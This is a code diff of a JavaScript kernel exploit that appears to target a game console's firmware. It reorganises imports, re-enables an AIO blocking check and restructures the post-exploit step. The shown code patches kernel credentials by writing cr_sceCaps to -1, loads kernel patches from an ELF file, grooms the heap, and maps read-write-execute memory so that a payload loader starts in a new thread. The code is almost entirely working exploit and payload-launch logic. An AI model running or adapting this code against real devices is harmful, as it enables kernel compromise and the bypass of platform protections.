@@ -24,20 +24,20 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 // * RESTORE - code will repair kernel panic vulnerability
 // * MEMLEAK - memory leaks that our code will induce
 
-import { Int } from './module/int64.mjs';
-import { mem } from './module/mem.mjs';
-import { log, die, hex, hexdump } from './module/utils.mjs';
-import { cstr, jstr } from './module/memtools.mjs';
-import { page_size, context_size } from './module/offset.mjs';
-import { Chain } from './module/chain.mjs';
+import { Int } from './int64.mjs';
+import { mem } from './mem.mjs';
+import { log, die, hex, hexdump } from './utils.mjs';
+import { cstr, jstr } from './memtools.mjs';
+import { page_size, context_size } from './offset.mjs';
+import { Chain } from './chain.mjs';
 
 import {
     View1, View2, View4,
     Word, Long, Pointer,
     Buffer,
-} from './module/view.mjs';
+} from './view.mjs';
 
-import * as rop from './module/chain.mjs';
+import * as rop from './chain.mjs';
 import * as config from './config.mjs';
 
 const t1 = performance.now();
@@ -96,9 +96,6 @@ const CPU_LEVEL_WHICH = 3;
 const CPU_WHICH_TID = 1;
 
 // sys/mman.h
-const PROT_READ = 1;
-const PROT_WRITE = 2;
-const PROT_EXEC = 4;
 const MAP_SHARED = 1;
 const MAP_FIXED = 0x10;
 
@@ -1522,7 +1519,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // cr_sceCaps[1]
     kmem.write64(p_ucred.add(0x68), -1);
 
-    const buf = await get_patches('./kpatch/900.elf');
+    const buf = await get_patches('./900.elf');
     // FIXME handle .bss segment properly
     // assume start of loadable segments is at offset 0x1000
     const patches = new View1(await buf, 0x1000);
@@ -1619,7 +1616,7 @@ function setup(block_fd) {
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
 
-    /*{
+    {
         const reqs1 = make_reqs1(1);
         const timo = new Word(1);
         const id = new Word();
@@ -1631,7 +1628,7 @@ function setup(block_fd) {
             die(`SceAIO system not blocked. errno: ${err}`);
         }
         free_aios(id.addr, 1);
-    }*/
+    }
 
     log('heap grooming');
     // chosen to maximize the number of 0x80 malloc allocs per submission
@@ -1745,26 +1742,7 @@ export async function kexploit() {
     }
 }
 
-/*kexploit().then(() => {
-    var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
-    var payload_loader = new View4(window.pld);
-    chain.sys('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
-    const ctx = new Buffer(0x10);
-    const pthread = new Pointer();
-    pthread.ctx = ctx;
-
-    call_nze(
-        'pthread_create',
-        pthread.addr,
-        0,
-        payload_loader.addr,
-        payload_buffer,
-    );
-})*/
-
-
-kexploit().then(() => {
-    function malloc(sz) {
+function malloc(sz) {
         var backing = new Uint8Array(0x10000 + sz);
         nogc.push(backing);
         var ptr = mem.readp(mem.addrof(backing).add(0x10));
@@ -1779,6 +1757,10 @@ kexploit().then(() => {
         ptr.backing = new Uint32Array(backing.buffer);
         return ptr;
     }
+
+
+kexploit().then(() => {
+    
     window.pld_size = new Int(0x26200000, 0x9);
 
     var payload_buffer = chain.sysp('mmap', window.pld_size, 0x300000, 7, 0x41000, -1, 0);
@@ -1799,4 +1781,9 @@ kexploit().then(() => {
         payload_loader,
         payload_buffer,
     );
+
+
+    
+
+
 })
